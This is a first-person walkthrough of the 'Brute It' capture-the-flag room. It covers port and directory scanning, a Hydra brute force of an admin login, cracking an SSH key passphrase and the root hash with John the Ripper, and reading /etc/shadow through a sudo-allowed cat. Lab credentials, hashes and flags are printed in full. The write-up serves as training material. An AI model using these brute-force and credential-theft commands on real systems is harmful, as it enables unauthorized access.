# Brute It

Brute It was a room that didn't involve CVE exploitation and involved the hacking of a realistic case of friends trying to make their own website. This room explores source code exploration (new topic in the Free Path). It involves SSH private keys, brute forcing and so much more!

I caught jackpot with Simple CTF, finding my first CVE (still left unreported). I also found an unintended flaw in this CTF!

I utilised many techniques every beginner would find of use.

## Information Gathering

Let's do an Nmap scan on the target's IP address. We also want to get the service versions to look them up on searchsploit (and for general recon) and the default scripts that are useful for web services, SSH services and so many other services! This is the default and the best yielding starting active information gathering Nmap scan that won't get WAFs suspicious nor take time. If the data won't be useful, use the -O switches (not very useful, service names likely contain OS name) or other scripts.

This is the result of the Nmap scan:

```
┌─[root@parrot]─[/]
└──╼ #nmap -sV -sC 10.10.177.133
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-01 18:44 CEST
Nmap scan report for 10.10.177.133
Host is up (0.061s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.45 seconds
```

We can clearly see the distribution being used is Ubuntu, advertised by the banner. There are two services: SSH and HTTP. We can also the system is running Linux. Before doing anything: let's search up exploits in the command line. 

### Exploit Searching

Exploits are essential to know in the information gathering engagement. Don't go straight to exploiting the site without searching it's service header! You might find a easier path even if the website is fully secure in the inside!

```
┌─[root@parrot]─[/]
└──╼ #searchsploit Apache httpd 2.4.29
Exploits: No Results
Shellcodes: No Results
┌─[root@parrot]─[/]
└──╼ #searchsploit OpenSSH 7.6p1
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                    | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                              | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                        | linux/remote/45939.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

We haven't found anything too valuable like an RCE. However, this effortless search revealed that OpenSSH is vulnerable to username enumeration which can be useful!

## Directory Enumeration

In this enumeration, we are using both **dirb** and **gobuster**. Trust me, **dirb** is amazing for recursive directory searching and **gobuster** can be used for bigger wordlist to uncover a lot more in a lot less time! When paired together, **dirb** can find directories inside directories and **gobuster** can quickly look up a 20,000+ word wordlist enhancing our searches.

```
┌─[root@parrot]─[/home/sandstoop]
└──╼ #dirb http://10.10.177.133/ -> Recursively searched site, got the admin panel, hidden SSH private key etc.

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Sep  1 18:46:02 2025
URL_BASE: http://10.10.177.133/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.177.133/ ----
==> DIRECTORY: http://10.10.177.133/admin/                                                                                                                                                   
+ http://10.10.177.133/index.html (CODE:200|SIZE:10918)                                                                                                                                      
+ http://10.10.177.133/server-status (CODE:403|SIZE:278)                                                                                                                                     
                                                                                                                                                                                             
---- Entering directory: http://10.10.177.133/admin/ ----
+ http://10.10.177.133/admin/index.php (CODE:200|SIZE:671)                                                                                                                                   
==> DIRECTORY: http://10.10.177.133/admin/panel/                                                                                                                                             
                                                                                                                                                                                             
---- Entering directory: http://10.10.177.133/admin/panel/ ----
+ http://10.10.177.133/admin/panel/id_rsa (CODE:200|SIZE:1766)                                                                                                                               
+ http://10.10.177.133/admin/panel/index.php (CODE:302|SIZE:379)                                                                                                                             
                                                                                                                                                                                             
-----------------
END_TIME: Mon Sep  1 18:59:50 2025
DOWNLOADED: 13836 - FOUND: 5
┌─[root@parrot]─[/home/sandstoop]
└──╼ #gobuster dir -u http://10.10.177.133/ -w /usr/share/wordlists/dirb/big.txt -> Way faster, found .htpasswd, .htaccess quickly
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.177.133/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.10.177.133/admin/]
/server-status        (Status: 403) [Size: 278]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

Let's go to the admin page (*/admin*), we can see a login page. Attempting a few basic SQL injection like *'* and *'1 OR 1=1--*, we can't do good here. However, we've learned to always check the source code of sites. This is essential for exploring insider comments or the code.

We can see the code sends the form's results into **""**, which in other words is itself. We can't make a perfect guess of the username however a comment in the source code helped us clear that up, "*John*" is being reminded that the username is "*admin*". This helpful clue tells us *john* and *admin* can be used in SSH (but for the web, try **admin**) and we can use the OpenSSH username enumeration if those users don't work!

Let's try brute forcing it:

*hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.177.133 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=invalid" -t 8*

The reason why using **/admin** by itself didn't work is because */admin* is not a PHP page meaning that it cannot process the form leading to incorrect results. This is why the source code and trying other pages is different. Using */admin/index.php*, it submits the form data to itself (the PHP page). I discovered this since using **/admin** led to false positives.


```
┌─[root@parrot]─[/home/sandstoop]
└──╼ #hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.177.133 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=invalid" -t 8 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-01 19:07:15
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking http-post-form://10.10.177.133:80/admin/index.php:user=^USER^&pass=^PASS^:F=invalid

[80][http-post-form] host: 10.10.177.133   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-01 19:07:46

```

The password is **xavier**. It works! We are in and there's a message for **John** and it has *his* SSH private key. However, it has a passphrase so we must crack it.

```
┌─[root@parrot]─[~]
└──╼ #ssh2john john_id_rsa --> Uses ssh2john to make a SSH private key usable in John the Ripper, john_id_rsa is the id_rsa we got, put this in a text file
john_id_rsa:$sshng$1$16$E32C44CDC29375458A02E94F94B280EA$1200$2423ec7a7b726dd092c7c40c39c58a9c802c9c84444e3663cfa00b2645f79ca488e2de34cbc59f59f901883aafc4b22652b16edfefd40a65f071e5bab89ed9e42a6a305a5440df28194c5c98e74f03cf1ba44066507fef0f62bf67e2a0d2f63406f6d3cf75447295c9ca0b68f56460dccf57495b26b31a5a0049785c137c12694a02447e14b8f6d6a6f33f337c63b6ca1d84342f8de322e94d28e12af636c8f0ed5ce58530a30b5594f04d4a5cd132e12171e2756d80d6c94424df3a552da5f2f99de666d32ae4d9008e2765a25d59b70331bf00f2e3bf038f135067b791fdca109aada38f7b4178a1fd0173999434305077e61260705c734af364e9ff6796fd293ca6c2e7804b2f0153cb7b1792e5002bb3ec063d9a7572957589273702754154ec5a078bb3cd35d48cfd87f19ebc6b7e01f2d31d7a3d0c2c70b5294716aa0ca2fcc76aea5f077a89413146dc173a80bdb566f3ee838593ef738174d1bce50ef5b6ddbda923846b688f1f9c45c7b72eab7e426e1cd551f8df1975a61904e0ddfe7d1ad1f4d0d4ddfad4a146af9105ecb5f8a8a273d9c3f69bbab148f9ad64083319abd4475243bc25f3ca36cf79c591cb472e0a6a7c042f8f778b37cb76fab6a36e85aac97d9499e81d1e37df7ddba2799deec6d419b23ef3e3ef06f92ae5b5c8a1a7df60cbfc19fe6b8a117969e01cc2c3a3fe319b1789ae99ada2fc2624e5e8e68f94784537cb0afeb140497375bca1439735f4308dd357324815b297fcc3b6c679cb9c15d988d2c0e2606364e6ebe6c148ee91f54b4fd24f30df213a7b3ba27c3ef47f8560551b11e58ebbb429a86453658a0a26b5d2af3208dd8166c44f6edd41cb3aaa83508b078c771c9a7ab1cd10d27e406403a22d22ac79e7e704d1fd2c7687d7b6fcef0915816b9185681b4d26117de342f1f717db770384673043c1866f16fddcd5578f4d3d30bd6c9bbe8d2a2537dab81d7244633597ba1c076c221e06414f13d50e36f8a9f553f0534f7f5ec3cff0634435082a832eee04e27e99c1fa2c38e3d716db2e77f14f8e98ea891399b2abe53422463dcb27600c1eaeb86adf900629e8d0ef3c5ef53e088085caf38201ae0eada38b3a1e1f53aaf72bede299f743c77c12fb82b37db8eb89793bedb0f93d807a23e5ef8fb1ce48466b511c3c96afa63a208a8d04e550046af87a61e6bfae21ce1de32241d42533eb4d0ba60ead50c4522703199195a1144e6768036e387ac4465ec6a29cf439adf496c97d8a1b046ef4d950bb129c621c678998967f7035c50e12759419e417caa199342dce21281320770fcca252f5bcc516991a53909d95a2932286b49448ac666f39c0fa04a412cd8a28dfabcd3cae14ed00152d1c8d0c7c9e613a3c2f336cc746836eed6b502fbcdc3c89c1423138299de963c28fcd29fe69e78dc178db0c20395b5776e7a44015d9e4aa70be65e36feca8c8f0a025b895c3052d9a065c50df01cd0f281703d74eccd4620363839445823fcc0584eb68be9560301ea67e18a3075a025bf733c20244a43719b40457a6429a20ca00cc772b7549a6c638695e766aee71e37768e9edf1c93491ec4d9b7ec51b9738f66fe9995eb9b1b2df970d4eaec756bd4eb96e9d37092592562ab31310be0b4563f0474b6c6f6e6d3ae52be833ff1ebe7630b68b835c88191f35711f96
┌─[✗]─[root@parrot]─[~]
└──╼ #john --wordlist=/usr/share/wordlists/rockyou.txt ssh2john_john_id_rsa
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (john_id_rsa)     
1g 0:00:00:00 DONE (2025-09-01 19:18) 16.66g/s 1210Kp/s 1210Kc/s 1210KC/s saloni..rock14
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The SSH private key's passphrase was **rockinroll**. Using what we know, we have **John**, **admin** and that's it. However, it's revealed this RSA private key is John's based on the site and hinted by the comments. However, we must try this.

```
[!] Always do the right chmod on SSH. Without such, the file won't work or will be unreliable. Chmod id_rsa as 600 with chmod john_id_rsa 600
┌─[root@parrot]─[~]
└──╼ #ssh -i john_id_rsa john@10.10.177.133 --> Our id_rsa is differently named
Enter passphrase for key 'john_id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep  1 17:27:00 UTC 2025

  System load:  0.0                Processes:           108
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 42%                IP address for ens5: 10.10.177.133
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt
THM{ssh_private_keys_are_very_good_and_can_be_bruteforced_hashes_arent_worthless_public_keys_arent_bad}
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat --> We can run cat... as root without a password???
john@bruteit:~$ sudo cat /etc/shadow --> We can run command with sudo as root with NOPASSWD
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
Simply put root's hash ($6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.) in a file, use john like so: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt. It'll be cracked easily
We have root's password, now...
john@bruteit:~$ su root
Password: 
root@bruteit:/home/john# cd /root
root@bruteit:~# ls
root.txt
root@bruteit:~# cat root.txt
THM{privilege_escalation_in_real_world_isnt_this_easy_look_at_suid_binaries_cronjobs_exploits}
```

Now, we learned a lot of things:

1. Brute forcing http-post-forms with Hydra
2. Finding private SSH hashes and cracking them using ssh2john and john
3. Performing basic privilege escalation
4. gobuster + dirb isn't bad. Let gobuster run if you want and dirb while working to recurse directories.
5. Perform basic searchsploit scans to uncover potential gold (fast, efficient, simple)
